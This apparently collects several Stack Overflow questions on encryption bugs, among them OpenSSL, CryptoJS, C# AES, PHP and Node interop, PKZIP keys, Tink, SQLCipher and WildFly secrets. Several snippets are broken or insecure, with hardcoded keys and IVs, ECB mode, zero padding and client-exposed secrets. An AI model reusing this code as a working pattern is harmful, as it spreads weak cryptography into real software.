<p>The comments I received were on point. The context shall be lightweight and should have a short life (I was missing this concept, thanks @maarten-bodewes). I cannot use the same context for both key generation and encryption and decryption. Better to use a new context for each operation. There are situation in which context can be reused, but I really need to understand deeper the lifetime of the context before and test this concept.</p>
<p>In particular, I followed the suggestion by @topaco and added the following code after code generation and after encryption, using <code>pkey</code>:</p>
<pre><code>cleanup(ctx, nullptr, nullptr, nullptr);

ctx = nullptr;
ctx = EVP_PKEY_CTX_new(pkey, nullptr);
if (!ctx) {
  cleanup(ctx, nullptr, nullptr, nullptr);
  return 1000;
} 
</code></pre>
<p>The modification solved the segmentation fault problem.</p>
<p>Furthermore, as I already noted and resuggested by @topaco, I had to initialize decryption for context:</p>
<pre><code>if (EVP_PKEY_decrypt_init(ctx) &lt;= 0) {
   cleanup(ctx, pkey, encrypted, decrypted);
   return 5;
}
</code></pre>
<p>The code compiles, but still does not work. Decrypted string is really different with respect to original message, so I still miss something, even if the problem in the title seems resolved.</p>
<p>As a side note: the suggestion of @Topaco (reusing the same context used for encryption directly in decryption) works (still the decrypted text is incorrect, but I think that is a separated issue).</p>
<p>IMPORTANT NOTE: This link is gold: <a href=""https://github.com/danbev/learning-openssl"" rel=""nofollow noreferrer"">https://github.com/danbev/learning-openssl</a> a full repository of example on OpenSSL! Thanks @topaco!</p>
"
"<p>I need a lil help with my NextJs application. I am using redis along with NextJs application. To establish redis connection, redis password and some api key are stored in an env file.</p>
<pre><code>NEXT_PUBLIC_API_KEY=&quot;&quot;
NEXT_PUBLIC_REDIS_PASSWORD=&quot;&quot;
</code></pre>
<p>How should I encrypt that env file and then decrypt it during runtime, I have seen few libraries that encrypt file using passphrase but then the passphrase still remains in the code, which I feel takes away the encryption purpose.</p>
<p><strong>Can someone let me know what is the best practice here? Any help/lead would be highly appreciated!!</strong></p>
"
"<p>I need to store some encrypted data and then (in second time) read the original value, I don't need very strong encryption, just much as the user can't be able to manipulate those string(s).</p>
<p>I'm trying this code:</p>
<pre><code> public static string Encrypt(string plainText)
 {
     if (Settings.LicenseOK())
     {

         byte[] plainTextBytes = Encoding.UTF8.GetBytes(plainText);

         var symmetricKey = Aes.Create();
         //symmetricKey.Mode = CipherMode.CBC;
         symmetricKey.Padding = PaddingMode.Zeros;
         ICryptoTransform encryptor = symmetricKey.CreateEncryptor();
         using MemoryStream ms = new MemoryStream();
         using CryptoStream cs = new CryptoStream(ms, encryptor, CryptoStreamMode.Write);

         cs.Write(plainTextBytes, 0, plainTextBytes.Length);
         cs.FlushFinalBlock();
         ms.Flush();
         return Convert.ToBase64String(ms.ToArray(), Base64FormattingOptions.None);

     }
     else
         throw (new Exception(&quot;Errore nella DLL GDWS&quot;));
  }

  public static string Decrypt(string cipherText)
  {
     if (Settings.LicenseOK())
     {
         byte[] cipherTextBytes = Convert.FromBase64String(cipherText);

         var symmetricKey = Aes.Create();
         //symmetricKey.Mode = CipherMode.CBC;
         symmetricKey.Padding = PaddingMode.Zeros;

         byte[] plainTextBytes = new byte[cipherTextBytes.Length];

         ICryptoTransform decryptor = symmetricKey.CreateDecryptor();
         using MemoryStream ms = new MemoryStream(cipherTextBytes);
         using CryptoStream cs = new CryptoStream(ms, decryptor, CryptoStreamMode.Read);

         cs.Read(plainTextBytes);
         return Encoding.UTF8.GetString(plainTextBytes);
     }
     else
         throw (new Exception(&quot;Errore nella DLL GDWS&quot;));
 }
}
</code></pre>
<p>But every time I encrypt a string, the encrypted one changes (I think it has to remain the same or it can't be decrypted), and I cannot revert the process (decryption) (the decryption process takes to an incomprehensible yet always different string).</p>
<p>Please help me.</p>
"
"<p>I'm creating a browser based Django app that allows a user to upload some files to encrypt and then to decrypt using a password.</p>
<p>I have managed to get the encryption part working but when decrypting the files all return blank.</p>
<p>I've read through the CryptoJS docs and searched around but can't find a solution that works. I'm sure this is just a minor mistake on my behalf but would really appreciate the help.</p>
<p>Please ignore the public/private key encryption stuff, one problem at a time :')</p>
<p><div class=""snippet"" data-lang=""js"" data-hide=""false"" data-console=""true"" data-babel=""false"">
<div class=""snippet-code"">
<pre class=""snippet-code-js lang-js prettyprint-override""><code>// Event listener for encrypt button click
document.getElementById('encryptBtn').addEventListener('click', function() {
  // Retrieve encryption mode, encryption type, and password from input fields
  var mode = document.getElementById('modeSelect').value;
  var encryptionType = document.getElementById('encryptionType').value;
  var password = document.getElementById('password').value;

  // Retrieve selected files
  var files = document.getElementById('fileInput').files;
  // Create a new JSZip instance
  var zip = new JSZip();
  // Total number of files to process
  var totalFiles = files.length;
  // Counter to track processed files
  var filesProcessed = 0;

  // Initialize SweetAlert2 progress popup
  Swal.fire({
    title: mode === 'encrypt' ? 'Encrypting Files' : 'Decrypting Files',
    html: 'Processing: 0 / ' + totalFiles,
    allowOutsideClick: false,
    didOpen: () =&gt; {
      Swal.showLoading();
    }
  });

  // Loop through each file
  for (var i = 0; i &lt; totalFiles; i++) {
    // Use a closure to capture the file variable
    (function(file) {
      var reader = new FileReader();

      // Event handler for when file is loaded
      reader.onload = function(event) {
        var data = event.target.result;
        var processedData;

        try {
          if (mode === 'encrypt') {
            // Encrypt the file data
            processedData = encryptData(data, encryptionType, password);
          } else {
            // Decrypt the file data
            processedData = decryptData(data, encryptionType, password);
          }

          // Add the processed data to the zip
          zip.file(file.name, processedData);
        } catch (error) {
          // Handle errors
          console.error('Error processing file:', error);
        }

        filesProcessed++;

        // Update progress in the SweetAlert2 popup
        Swal.update({
          html: 'Processing: ' + filesProcessed + ' / ' + totalFiles
        });

        // If all files are processed, generate the zip and trigger download
        if (filesProcessed === totalFiles) {
          zip.generateAsync({
            type: 'blob'
          }).then(function(content) {
            // Close SweetAlert2 popup
            Swal.close();
            // Trigger download of the encrypted/decrypted zip file
            saveAs(content, mode === 'encrypt' ? 'encrypted_files.zip' : 'decrypted_files.zip');
          });
        }
      };

      // Read file as array buffer
      reader.readAsArrayBuffer(file);
    })(files[i]); // Pass the current file to the closure
  }
});

// Function to encrypt data based on encryption type
function encryptData(data, encryptionType, password) {
  if (encryptionType === 'password') {
    var parsedData = CryptoJS.enc.Utf8.parse(data);
    var encrypted = CryptoJS.AES.encrypt(parsedData, password).toString();
    return encrypted;
  } else if (encryptionType === 'publicKey') {
    // Implement encryption using public key
    // Example: Encrypt data using public key
    return data;
  } else {
    return data;
  }
}

// Function to decrypt data based on encryption type
function decryptData(data, encryptionType, password) {
  if (encryptionType === 'password') {
    // Decrypt data using AES 256 decryption
    var decrypted = CryptoJS.AES.decrypt(data, password);
    var decryptedData = decrypted.toString(CryptoJS.enc.Utf8);
    console.log(decryptData)
    return decryptedData;
  } else if (encryptionType === 'publicKey') {
    // Implement decryption using public key
    // Example: Decrypt data using public key
    return data;
  } else {
    // If encryption type is not recognized, return original data
    return data;
  }
}</code></pre>
<pre class=""snippet-code-html lang-html prettyprint-override""><code>&lt;script src=""https://cdnjs.cloudflare.com/ajax/libs/jszip/3.6.0/jszip.min.js""&gt;&lt;/script&gt;
&lt;script src=""https://cdnjs.cloudflare.com/ajax/libs/FileSaver.js/2.0.5/FileSaver.min.js""&gt;&lt;/script&gt;
&lt;script src=""https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js""&gt;&lt;/script&gt;
&lt;script src=""https://cdn.jsdelivr.net/npm/sweetalert2@11""&gt;&lt;/script&gt;</code></pre>
</div>
</div>
</p>
"
"<p>I have a PHP project that requires me to pass encrypted information to a 3rd party service developed using C# but my attempts at it has failed. This is the c# code for encryption.</p>
<pre class=""lang-cs prettyprint-override""><code>public string EncryptRequest(string clearText, string SaltValue, string PassPhrase, int PasswordIterations, int Blocksize, string InitVector)
{
    string cipherText = &quot;&quot;;
    try
    {
        if (SaltValue != null &amp;&amp; PassPhrase != null)
        {
            var plainText = clearText;
            var saltValueBytes = Encoding.ASCII.GetBytes(SaltValue);
            var password = new Rfc2898DeriveBytes(PassPhrase, saltValueBytes, PasswordIterations);
            var keyBytes = password.GetBytes(Blocksize);
            var symmetricKey = new RijndaelManaged();
            var initVectorBytes = Encoding.ASCII.GetBytes(InitVector);
            var encryptor = symmetricKey.CreateEncryptor(keyBytes, initVectorBytes);
            var memoryStream = new MemoryStream();
            var cryptoStream = new CryptoStream(memoryStream, encryptor, CryptoStreamMode.Write);
            var plainTextBytes = Encoding.UTF8.GetBytes(plainText);
            cryptoStream.Write(plainTextBytes, 0, plainTextBytes.Length);
            cryptoStream.FlushFinalBlock();
            var cipherTextBytes = memoryStream.ToArray();
            memoryStream.Close();
            cryptoStream.Close();
            cipherText = Convert.ToBase64String(cipherTextBytes);
            Console.WriteLine(cipherText);
            Console.WriteLine(&quot;\n end&quot;);
            return cipherText;
        }
        else
        {
            cipherText = &quot;Enter Key to Encrypt json&quot;;
            return cipherText;
        }
    }
    catch (Exception ex)
    {
        if (ex.Message.Contains(&quot;Padding is invalid&quot;))
        {
            cipherText = &quot;Invalid Keys&quot;;
            return cipherText;
        }
        if (ex.Message.Contains(&quot;The input is not a valid Base-64 string &quot;))
        {
            cipherText = ex.Message;
            return cipherText;
        }
    }
    return &quot;&quot;;
}
</code></pre>
<p>This the decyption code</p>
<pre class=""lang-cs prettyprint-override""><code>public string DecryptResponse(string clearText, string SaltValue, string PassPhrase, int PasswordIterations, int Blocksize, string InitVector)
{
    try
    {
        if (SaltValue != null &amp;&amp; PassPhrase != null)
        {
            var plainText = clearText;
            var saltValueBytes = Encoding.ASCII.GetBytes(SaltValue);
            var password = new Rfc2898DeriveBytes(PassPhrase, saltValueBytes, PasswordIterations);
            var keyBytes = password.GetBytes(Blocksize);
            var symmetricKey = new RijndaelManaged();
            var initVectorBytes = Encoding.ASCII.GetBytes(InitVector);
            var encryptor = symmetricKey.CreateDecryptor(keyBytes, initVectorBytes);
            ICryptoTransform decryptor = encryptor;
            byte[] buffer = Convert.FromBase64String(plainText);
            using (MemoryStream ms = new MemoryStream(buffer))
            {
                using (CryptoStream cs = new CryptoStream((Stream)ms, decryptor, CryptoStreamMode.Read))
                {
                    using (StreamReader streamReader = new StreamReader((Stream)cs))
                    {

                        return streamReader.ReadToEnd();
                    }
                }
            }
        }
    }
    catch (Exception ex)
    {
        if (ex.Message.Contains(&quot;Padding is invalid&quot;))
        {
            return &quot;Invalid Keys&quot;;
        }

        if (ex.Message.Contains(&quot;The input is not a valid Base-64 string &quot;))
        {
            return ex.Message.ToString();
        }
    }
    return &quot;&quot;;
}
</code></pre>
<p>I have tried to replicate it as follows</p>
<pre class=""lang-php prettyprint-override""><code>public function encryptRequest(string $clearText)
{
    try {
        $saltValueBytes = utf8_encode(env('SALT_VALUE'));
        $password = hash_pbkdf2(&quot;sha1&quot;, env('PASSPHRASE'), $saltValueBytes, env('PASSWORD_ITERATIONS'), env('BLOCKSIZE'), true);
        $keyBytes = $password;
        $cipherTextBytes = openssl_encrypt($clearText, 'AES-128-CBC', $keyBytes, 0, env('INIT_VECTOR'));
        $cipherText = base64_encode($cipherTextBytes);
        return response()-&gt;json(['value' =&gt; $cipherText]);
    } catch (Exception $e) {
        Log::error($e-&gt;getMessage());
        return 'error';
    }
}

public function decryptResponse(string $cipherText)
{
    try {
        if (env('SALT_VALUE') !== null &amp;&amp; env('PASSPHRASE') !== null) {
            $key = hash_pbkdf2(&quot;sha1&quot;, env('PASSPHRASE'), env('SALT_VALUE'), env('PASSWORD_ITERATIONS'), env('BLOCKSIZE'), true);
            $cipherTextBytes = base64_decode($cipherText);
            $plainText = openssl_decrypt($cipherTextBytes, 'AES-128-CBC', $key, 0, env('INIT_VECTOR'));
            Log::info($plainText);
            return $plainText;
        }
    } catch (Exception $e) {
        return &quot;&quot;;
    }
}
</code></pre>
<p>The output on encryption does not match. And the decryption from C# also fails and return null.</p>
<hr />
<p>Sample data:</p>
<pre class=""lang-none prettyprint-override""><code>SaltValue:          Sklqg625*&amp;dltr01r
PassPhrase:         Et2347fdrloln95@#qi 
PasswordIterations: 2  
Blocksize:          32
InitVector:         Jod0458jpkc34vb9 
</code></pre>
<p>Sample input:</p>
<pre class=""lang-none prettyprint-override""><code>{&quot;Bvn&quot;:&quot;1234567890&quot;,&quot;FirstName&quot;:&quot;Sadik&quot;,&quot;LastName&quot;:&quot;Salifu&quot;,&quot;DateOfBirth&quot;:&quot;3-Jun-90&quot;,&quot;PhoneNumber&quot;:&quot;09065880896&quot;}
</code></pre>
<p>Sample output:</p>
<pre class=""lang-none prettyprint-override""><code>{&quot;resp&quot;:&quot;UJ2C2j4A478lYvqJv2yIfDlbxgtS5CnYb68lFz0ph6Ihd/CtV3mp6ttkdvgEzVDhsqCX0JW8021cTuJbs6g/wB+VyHEcnsJqMmvLMTkVe8WUHan8RrM9aS42g6kBtFhk8J3NpK2+kvbnH87k2pXRl/XHIW6n8vSr3qn2FcTZtGA=&quot; }
</code></pre>
"
"<p>Good evening all.</p>
<p>I have been trying to figure this out for literal days now but to no avail.</p>
<h1>Situation:</h1>
<ol>
<li>I am encrypting a string in C++ with OpenSSL's AES Lib. Then I am converting it to Base64 and sending it to my NodeJS Server for decryption.</li>
<li>The JS server correctly recieves the encoded data, but always fails the decryption, no matter how I set things up, or change settings, ect</li>
<li>I am using AES256 CBC</li>
<li>The C++ encrypt function <strong>should</strong> be replicating the desired behaviour of <code>PKCS#7</code> according to the documentation I have found about PKCS#7</li>
</ol>
<h1>Relevant code blocks:</h1>
<p><strong>C++ Code</strong></p>
<pre><code>#include &lt;iostream&gt;
#include &lt;string&gt;
#include &lt;openssl/aes.h&gt;
#include &lt;openssl/rand.h&gt;

#include &quot;base64.h&quot;

using namespace std;

// AES encryption key and IV (Initialization Vector)
const unsigned char aes_key[] = {
    &quot;0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef&quot;
};

unsigned char aes_iv[] = {
    &quot;0123456789abcdef0123456789abcdef&quot;
};

string EncryptAES(const string&amp; plainText) {
    AES_KEY enc_key;
    AES_set_encrypt_key(aes_key, 256, &amp;enc_key);

    // Determine padding length
    int paddingLength = AES_BLOCK_SIZE - (plainText.length() % AES_BLOCK_SIZE);

    // If the plaintext length is already a multiple of the block size,
    // add a full block of padding
    if (paddingLength == 0) {
        paddingLength = AES_BLOCK_SIZE;
    }

    // Append padding bytes
    string paddedText = plainText;
    for (int i = 0; i &lt; paddingLength; ++i) {
        paddedText.push_back((char)paddingLength);
    }

    // Encrypt padded plaintext
    string cipherText;
    cipherText.resize(paddedText.length());
    AES_cbc_encrypt((const unsigned char*)paddedText.c_str(), (unsigned char*)&amp;cipherText[0], paddedText.length(), &amp;enc_key, aes_iv, AES_ENCRYPT);

    return cipherText;
}

int main() {
    // Plain text message to encrypt
    string plainText = &quot;Hello, this is a secret message.&quot;;

    // Encrypt the message using AES
    string encryptedText = EncryptAES(plainText);

    auto encodedText = base64_encode(encryptedText);

    std::cout &lt;&lt; &quot;Encoded text: &quot; &lt;&lt; encodedText &lt;&lt; std::endl;

    return 0;
}
</code></pre>
<p><a href=""https://github.com/ReneNyffenegger/cpp-base64"" rel=""nofollow noreferrer"">Base64 Lib Used</a></p>
<p><strong>NodeJS Server</strong></p>
<pre><code>const express = require('express');
const bodyParser = require('body-parser');
const crypto = require('crypto');

const app = express();

// Middleware to parse JSON and URL-encoded bodies
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// AES decryption key and IV (Initialization Vector)
const aes_key = Buffer.from(&quot;0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef&quot;, 'hex');
const aes_iv = Buffer.from(&quot;0123456789abcdef0123456789abcdef&quot;, 'hex');

// AES decryption function
function DecryptAES(cipherText) {
    const decipher = crypto.createDecipheriv('aes-256-cbc', aes_key, aes_iv);
    let decrypted = decipher.update(cipherText, 'base64', 'utf8');
    decrypted += decipher.final('utf8');
    return decrypted;
}

app.post('/decrypt', (req, res) =&gt; {
    const { encryptedText } = req.body;

    if (!encryptedText) {
        return res.status(400).json({ error: 'Missing encryptedText in request body' });
    }

    try {
        const decryptedText = DecryptAES(encryptedText);
        res.send(decryptedText);
        console.log(decryptedText);
    } catch (error) {
        console.error('Decryption failed:', error);
        res.status(500).send('Decryption failed');
    }
});

const port = 3000;
app.listen(port, () =&gt; {
    console.log(`Server is running on http://localhost:${port}`);
});
</code></pre>
<p><strong>My Question:</strong>
Does anyone know what is happening? As far as I can tell, the encryption works perfectly, but the NodeJS refuses to correctly decode anything. I am unsure where my problem lays and have run out of options. Thanks all.</p>
<h1>Behaviour:</h1>
<ul>
<li>When the server attempts to decrypt the key, it results a <code>Bad Decrypt</code></li>
<li>If I use <code>dicipher.setAutoPadding(false)</code> it will incorrectly decrypt the string. (Will result in gibberish)</li>
<li>When I use <a href=""https://the-x.cn/en-US/cryptography/Aes.aspx"" rel=""nofollow noreferrer"">an online AES decryptor</a> the string from the C++ code works perfectly</li>
<li>Generating my own string (And encrypting ect) in NodeJS produces a different result to the C++ code (And websites)</li>
</ul>
<p><strong>Notes:</strong></p>
<ul>
<li>I am sending the POST request via <a href=""https://insomnia.rest/download"" rel=""nofollow noreferrer"">Insomnia</a> for testing. Sending the required JSON body with the below content.</li>
<li>I have a feeling the issue is related to how either the buffer is generated or decrypted, but none of my testing has produced any results so :/</li>
</ul>
<p><strong>JSON Body</strong></p>
<pre><code>{
    &quot;encryptedText&quot;: &quot;4oUys+a9EWvflSPZPxHYIfXcLV6wwisg7IlQ5a6Pa8CMkMiIwY2+ySMkQG351jJc&quot;
}
</code></pre>
<p>Plain text = &quot;Hello, this is a secret message.&quot; -&gt; AES256_CBC -&gt; Base64</p>
"
"<p>I am planning to create a project that uses blockchain to store data which, when shared mutually, brings significant benefits but poses risks and must maintain its integrity if disclosed to just anyone.</p>
<p>For this, encryption technology is necessary.</p>
<p>Is there a method to encrypt data using the public keys or specific keys of two individuals, and decrypt the encrypted data using the private key or a specific key of one of these two individuals?</p>
<p>Currently, I am designing the system using a mix of symmetric and asymmetric keys, but I would be very grateful for any other suggestions or opinions.</p>
"
"<p>I recently published both a React application and a nodejs web service on render.com. Additionally, I purchased a domain from GoDaddy and set up a custom domain for my React application on Render, using that domain, and a custom domain for the web service, using a subdomain of that domain.</p>
<p>I can access both domains with no issues from most devices, but in other devices I get the “ERR_SSL_VERSION_OR_CIPHER_MISMATCH” error. I've checked my domain's certificate, TLS version, cipher suite, and everything is as it's supposed to be. I don't know what else to check and/or do to fix this issue, since I really need to access those applications from those devices.</p>
"
"<p>I'm trying to write a <a href=""https://en.wikipedia.org/wiki/Caesar_cipher"" rel=""nofollow noreferrer"">Caesar cipher</a> decoder in Java, but I get unexpected output (see below example).</p>
<p>The <code>BetterDecrypt()</code> method takes a string <code>cipherText</code> to be decoded, as well as an integer <code>shiftKey</code> that is the number of places up or down the alphabet each character of the string is to be shifted. If a character is not in <code>String ALPHABET = &quot;abcdefghijklmnopqrstuvwxyz&quot;</code>, then I want to keep the character as is, eg &quot;ab4c&quot; should be decoded &quot;bc4d&quot;.</p>
<pre><code>import java.io.*;
import java.util.*;

public class SimpleDecoder {
    public static final String ALPHABET = &quot;abcdefghijklmnopqrstuvwxyz&quot;;

    public static String BetterDecrypt(String cipherText, int shiftKey) {
        cipherText = cipherText.toLowerCase();
        String message = &quot;&quot;;
        for (int ii = 0; ii &lt; cipherText.length(); ii++) {
            char character = cipherText.charAt(ii);
            if (ALPHABET.contains(Character.toString(character))) {
                int charPosition = ALPHABET.indexOf(cipherText.charAt(ii));
                int keyVal = (charPosition - shiftKey) % 26;
                if (keyVal &lt; 0) {
                    keyVal = ALPHABET.length() + keyVal;
                char replaceVal = ALPHABET.charAt(keyVal);
                message += replaceVal;
                }
            } else {
                message += character;
            }
        }
        return message;
    }

    public static void main(String[] args) {
        System.out.println(BetterDecrypt(&quot;ab4c&quot;, -1));
        // OUTPUT: 4   EXPECTED OUTPUT: bc4d
        System.out.println(BetterDecrypt(&quot;ab4c&quot;, 1));
        // OUTPUT: z4  EXPECTED OUTPUT: za4b
    }
}
</code></pre>
"
"<p>I'm looking for a secure way to store a shared secret in my Android app.</p>
<p>SharedPreferences is not secure because data is stored unencrypted and can be easily accessed on rooted devices.</p>
<p>I've read about using KeyStore and EncryptedSharedPreferences for secure storage. EncryptedSharedPreferences encrypts data before storing it in SharedPreferences, and the encryption key is stored in KeyStore.</p>
<p>I'm confused about whether I should use EncryptedSharedPreferences or store the shared secret directly in KeyStore. Which approach is more secure and why?</p>
"
"<p>I'm using <code>aws_encryption_sdk</code> to encrypt and decrypt data. Once we hit an issue and our process stuck for ~24 hours. One of the hypotheses was that there was a problem with string value decryption, because of the significantly increased volume of data. I want to set a connection timeout and retry strategy.</p>
<p>Additional question: Does this SDK connect to AWS to get the key and then do the decryption on the client side or does it get the key using boto and then make another call to AWS with that key and the text to decrypt and the decryption happens on the server side?</p>
<p>I did some research but couldn't find anything.</p>
"
"<p>This Below is the String using Tink AESGCM</p>
<pre><code># com.google.crypto.tink.proto.KeysetInfo@ba8523ee
key_info {
  key_id: 980166534
  output_prefix_type: TINK
  output_prefix_type_value: 1
  status: ENABLED
  status_value: 1
  type_url: &quot;type.googleapis.com/google.crypto.tink.AesGcmKey&quot;
}
primary_key_id: 980166534
</code></pre>
<p>I am unable to convert it in KeySetHandle</p>
<p>Below is the code What i have tried but not getting possible results always showing error on Base64</p>
<pre><code>fun createKeysetHandleFromString(serializedKeysetInfo: String): KeysetHandle {
        try {
            val keysetBytes = Base64.getDecoder().decode(serializedKeysetInfo.toByteArray())

            val keyset = Keyset.parseFrom(keysetBytes)

            return fromKeyset(keyset)
        } catch (e: Exception) {
            e.printStackTrace()
            throw IllegalArgumentException(&quot;Error creating KeysetHandle from string: ${e.message}&quot;)
        }
    }
</code></pre>
<p>Error:
creating KeysetHandle from string: Illegal base64 character 23</p>
"
"<p>I'm working with an application (Jobvite) that requires me to encrypt data that is sent to its API. Specific steps involve generating a random AES key, using it to encrypt a JSON message, then using a RSA public key to encrypt the AES key, and then send both the encrypted message and the encrypted AES key to the API endpoint (in a JSON object).</p>
<p>I have an example for doing this using Java that works as expected (the code generates the encrypted message + key, which I then post to the API endpoint using Postman, and I get back a successful response). I have implemented a Node.js version of that code. But when I post the encrypted message + key generated by this code to the API endpoint, it returns an error. I verified using online tools that the encrypted message and key produced by the Node.js code do get decrypted successfully, so it seems like the issue might be with the format, or padding, etc.</p>
<p>Any help is appreciated. Thanks in advance.</p>
<p><strong>JAVA</strong></p>
<pre><code>String public_key_string = &quot;MIIBIjANBgk************BEtWbhxQIvd4QIDAQAB&quot;;

String message = &quot;{\&quot;filter\&quot;:{\&quot;process\&quot;:{\&quot;DateCreated\&quot;:{\&quot;gte\&quot;:\&quot;2023-10-01T10:50:00Z\&quot;,\&quot;lte\&quot;:\&quot;2024-01-31T10:50:00Z\&quot;}}}}&quot;;

KeyGenerator key_generator = KeyGenerator.getInstance(&quot;AES&quot;);
key_generator.init(256);
SecretKey aes_key = key_generator.generateKey();
byte[] aes_key_byte_array = aes_key.getEncoded();
SecretKey secret_key = new SecretKeySpec(aes_key_byte_array, &quot;AES&quot;);

byte[] pub_key_byte_array = Base64.getDecoder().decode(public_key_string);
EncodedKeySpec encoded_key_spec = new X509EncodedKeySpec(pub_key_byte_array);
PublicKey public_key = KeyFactory.getInstance(&quot;RSA&quot;).generatePublic(encoded_key_spec);

Cipher cipher = Cipher.getInstance(&quot;RSA/ECB/PKCS1Padding&quot;);
cipher.init(1, public_key);
byte[] encrypted_key_bytes = cipher.doFinal(secret_key.getEncoded());
String encrypted_key = Base64.getEncoder().encodeToString(encrypted_key_bytes);

Cipher cipher2 = Cipher.getInstance(&quot;AES/ECB/PKCS5Padding&quot;);
cipher2.init(1, secret_key);
byte[] cipher_bytes = cipher2.doFinal(message.getBytes(StandardCharsets.UTF_8));
String encrypted_message = Base64.getEncoder().encodeToString(cipher_bytes);

System.out.println(encrypted_message);
System.out.println(encrypted_key);
</code></pre>
<p><strong>Node.js</strong></p>
<pre><code>const public_key = &quot;-----BEGIN PUBLIC KEY-----\nMIIBIjANBgk*****BEtWbhxQIvd\n4QIDAQAB\n-----END PUBLIC KEY-----\n&quot;

const message = JSON.stringify({&quot;filter&quot;:{&quot;process&quot;:{&quot;DateCreated&quot;:{&quot;gte&quot;:&quot;2023-10-01T10:50:00Z&quot;,&quot;lte&quot;:&quot;2024-01-31T10:50:00Z&quot;}}}});

const aes_key = crypto.randomBytes(32);
const encrypted_key = crypto.publicEncrypt({&quot;key&quot;: public_key, &quot;padding&quot;: crypto.constants.RSA_PKCS1_PADDING}, aes_key).toString(&quot;base64&quot;);

const cipher = crypto.createCipheriv(&quot;aes-256-ecb&quot;, Buffer.from(aes_key), null);
let encrypted_message = cipher.update(message, &quot;utf8&quot;, &quot;base64&quot;);
encrypted_message += cipher.final(&quot;base64&quot;);

console.log(encrypted_message);
console.log(encrypted_key);
</code></pre>
"
"<p>For a simple project, I want to use the CKKS encryption scheme via the PYfhel library. I need to evaluate a matrix-vector product, e.g. Y = A*X.</p>
<p><strong>Question</strong>: How to do it properly with PyFhel ?</p>
<p><strong>Partial Answers</strong></p>
<ol>
<li><p>For the moment, my idea is to encrypt each coefficient of A and X as different data and implement the matrix vector product by writing manually the scalar product. But this solution is not really satisfactory and scalable. And I have doubt about the security of encrypting only scalars ?</p>
</li>
<li><p>I can implement the dot product of the first line of A with X and the second line of A with X. This will give me the two components of Y but how to get the fully encrypted vector ?</p>
</li>
</ol>
"
"<p>The <strong>PKZIP</strong> stream cipher is a symmetric encryption scheme, where the secret key is required for both encryption and decryption. This key is used to produce a key stream of bytes for the one-time pad algorithm. The stream cipher has a <strong>96-bit</strong> internal state split into three <strong>32-bit</strong> values denoted <em>key0</em>, <em>key1</em> and <em>key2</em>.</p>
<p>That is according to <a href=""https://www.scitepress.org/Papers/2019/73605/73605.pdf"" rel=""nofollow noreferrer"">this</a></p>
<p>But According to <a href=""http://www.pkware.com/appnote"" rel=""nofollow noreferrer"">PKWARE APPNOTE</a></p>
<pre><code>6.1.3 Each encrypted file has an extra 12 bytes stored at the start 
of the data area defining the encryption header for that file.  The
encryption header is originally set to random values, and then
itself encrypted, using three, 32-bit keys.  The key values are
initialized using the supplied encryption password.  After each byte
is encrypted, the keys are then updated using pseudo-random number
generation techniques in combination with the same CRC-32 algorithm
used in PKZIP and described elsewhere in this document.

6.1.4 The following are the basic steps required to decrypt a file:

1) Initialize the three 32-bit keys with the password.
2) Read and decrypt the 12-byte encryption header, further
   initializing the encryption keys.
3) Read and decrypt the compressed data stream using the
   encryption keys.
</code></pre>
<p>Initializing the encryption keys:</p>
<pre><code>Key(0) &lt;- 305419896
Key(1) &lt;- 591751049
Key(2) &lt;- 878082192

loop for i &lt;- 0 to length(password)-1
    update_keys(password(i))
end loop

Where update_keys() is defined as:

update_keys(char):
  Key(0) &lt;- crc32(key(0),char)
  Key(1) &lt;- Key(1) + (Key(0) &amp; 000000ffH)
  Key(1) &lt;- Key(1) * 134775813 + 1
  Key(2) &lt;- crc32(key(2),key(1) &gt;&gt; 24)
end update_keys
</code></pre>
<p>The confusing part is where and how do we get <strong>Keys</strong>(<em>key0,key1,key2</em>)?</p>
<p>And below is my sample data for testing the above mentioned steps 1 and 2.</p>
<p>password:</p>
<pre><code>1234
</code></pre>
<p>12 bytes encrypted header:</p>
<pre><code>3A CE 1D 8D E4 D1 ED D1 E5 08 4F EC
</code></pre>
<p>crc:</p>
<pre><code>E07B8FC3
</code></pre>
<p>Now what is the correct way of getting the three <strong>32-bit</strong> keys?</p>
<p>I need to understand this part in order to code my zip recovery software.</p>
"
"<p>i'm using sqlcipher in cli mode on windows and it works very well. now i'm trying to integrate it into my QT 6.6 project, but it won't work.
I've tried adding the following config to my .pro file</p>
<pre><code>INCLUDEPATH += C:/CODE/QT/sqlcipher/src
LIBS += C:/CODE/QT/sqlcipher/sqlite3.lib
DEFINES += SQLITE_HAS_CODEC
</code></pre>
<p>hier is my QT code for connecting to sqlcipher</p>
<pre><code>QSqlDatabase db = QSqlDatabase::addDatabase(&quot;QSQLITE&quot;);
db.setDatabaseName(mydb.sqlite);
db.open().
QSqlQuery query;
query.exec(&quot;PRAGMA KEY='ma_phrase_secrete';&quot;);
</code></pre>
<p>but the sql database created with this code can be accessed on sqlitestudio without a password, so the encryption didn't work</p>
"
"<p>We have several apps running on WildFly 24 and 26 servers and some of the standalone.xml files include credentials in datasources as well as other sensitive values in the system-properties. Using the jboss vault tool for WildFly 24 we have managed to encrypt and store those values in vaults and they can all (datasource passwords and system property values) be called using the vault reference. We need to encrypt/mask those values so that they are not readable.</p>
<p>When trying to use the same method for WildFly 26 we found out that vault wasn't available and we had to use Elytron credential store which would only be useful for datasources, not for system properties as it is stated <a href=""https://access.redhat.com/solutions/3152361"" rel=""nofollow noreferrer"">here</a> :</p>
<blockquote>
<p>Credential store cannot be used as expressions in system properties prior to JBoss EAP 7.4.4.
The suggestion is to use Vault to store any sensitive data/strings that you might not want so display such as keystore and truststore passwords that need to be specified in system-properties for outbound SSL connections, or for the use of any other strings/properties.</p>
</blockquote>
<p>How else can we mask/encrypt those values or where else can we place them so that maybe elytron can decrypt them before the apps are deployed?</p>
<p>Thanks in advance</p>
"
"<p>the algorithm in the header of the jwt is 'http://www.w3.org/2001/04/xmldsig-more#rsa-sha256',
but when pyjwt runs internally: <code>alg_obj = self.get_algorithm_by_name(alg)</code>
it raises:</p>
<pre><code>NotImplementedError: Algorithm not supported
</code></pre>
<p>If i manually replace alg to 'RS256' during debug it works</p>
<p>Why doesn't the library recognize the algorithm in the link format?</p>
"
"<p>Crypto RSA Encryption randomly generates 255 bytes output instead of expected 256  in next.js application
This results in failure when decrypting the data.</p>
<p>Interestingly this works absolutely fine when using only NodeJS, But randomly gives the issue when run in the browser</p>
